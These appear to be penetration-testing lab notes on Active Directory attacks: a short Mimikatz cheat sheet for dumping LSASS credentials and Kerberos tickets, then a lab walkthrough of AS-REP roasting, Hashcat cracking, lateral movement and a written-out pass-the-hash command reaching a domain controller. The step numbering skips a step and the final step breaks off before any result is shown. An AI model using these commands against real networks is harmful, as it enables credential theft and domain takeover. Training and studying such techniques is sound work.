Cached AD Credentials

Mimikatz

Start Mimikatz:

./mimikatz.exe

Set the interaction with a process owned by another account:

privilege::debug

Dump credentials of all logged-on users. Then search for NTLM and SHA1 hashes:

sekurlsa::logonpasswords

Show Tickets

Explanation:


When accessing a network resource (such as an SMB share), Windows must authenticate to that service,
and to do so Kerberos automatically creates a Service Ticket (TGS).

List the content of SMB shares on WEB04 (creates and caches a service ticket):

dir \\web04.corp.com\backup

Show tickets stored in memory with mimikatz:

sekurlsa::tickets

We can also request a TGS for specific resources within the domain.

PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

  1. Initial access with low‑privileged credentials
    We were provided with valid domain credentials for the user `pete`. Although RDP access failed, these credentials were sufficient to perform domain enumeration and Kerberos‑based attacks.

    Using `GetNPUsers`, we identified accounts without Kerberos pre‑authentication enabled and requested AS‑REP hashes.
    > Reason: AS‑REP roasting allows offline password cracking without interacting further with the domain, reducing detection and avoiding lockouts.
  3. Password cracking using a custom Hashcat rule
    A custom rule file was created to append nothing, `"1"`, or `"!"` to each password from `rockyou.txt`, as required by the exercise.
    > Reason: Custom rules significantly increase cracking success by matching common user password modification patterns.
  4. Lateral movement using cracked credentials
    The cracked credentials for `mike` were used to obtain an interactive session on `CLIENT75`.
    > Reason: Compromising additional domain users increases the chance of finding privileged credentials stored in memory.
  5. Credential dumping with Mimikatz
    While running under the context of `mike`, Mimikatz was used to dump credentials from LSASS, revealing the NTLM hash of the domain user `maria`.
    > Reason: Cached credentials in LSASS often include privileged accounts that have authenticated to the system.
  6. Pass‑the‑Hash to authenticate as `maria`
    Although `maria` was locked out for interactive logons, a Pass‑the‑Hash attack was performed using:
    sekurlsa::pth /user:maria /domain:corp.com /ntlm:<hash> /run:powershell.exe

    From the spawned process, SMB access to the Domain Controller was tested:
    dir \\DC1\C$
    Access was granted, confirming successful authentication as `maria`.
    > Reason: Administrative SMB access to the DC confirms effective privilege escalation, even though the local interactive user (`whoami`) remained `mike`.

    The flag was retrieved from the Domain Administrator’s Desktop:
